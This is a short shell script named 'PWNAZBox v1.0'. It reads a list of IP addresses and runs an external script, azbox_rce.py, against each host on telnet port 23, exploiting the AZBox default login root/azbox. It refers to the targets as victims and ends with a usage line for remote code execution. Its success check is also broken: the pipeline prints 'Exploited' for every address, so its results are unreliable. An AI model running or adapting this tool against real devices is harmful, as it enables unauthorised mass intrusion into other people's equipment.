#!/bin/sh
#
# Scanner for check AZBox Default User "root/azbox"
# By Jonatas Fil (Dkr)
#

clear
# BANNER
echo " "
echo "PWNAZBox v1.0"
echo "AZBox Scanner Default User"
sleep 2
echo " "
# CREDIT
echo "By Jonatas Fil [Dkr]"
sleep 2
echo " "
# YOUR LIST WITH IP
echo -n "Your target list: "
read list
# LOADING TARGET 
while vitimas= read -r ip; do echo "[+] $ip <- AZBox Target..."; done < $list
sleep 2
echo " "
# BANNER 2
echo "Scanning AZBox..."
echo " "
# CHECK VULN
while list= read -r ip; do echo ' ' | python azbox_rce.py RHOST=$ip RPORT=23 | grep "AZBox" | read AZBox | echo "[!] $ip <- Exploited !"; done < $list
echo " "
# HELP
echo "For pwn your AZBox target: python azbox_rce.py RHOST=victim RPORT=23"
sleep 5
echo "./Exit"
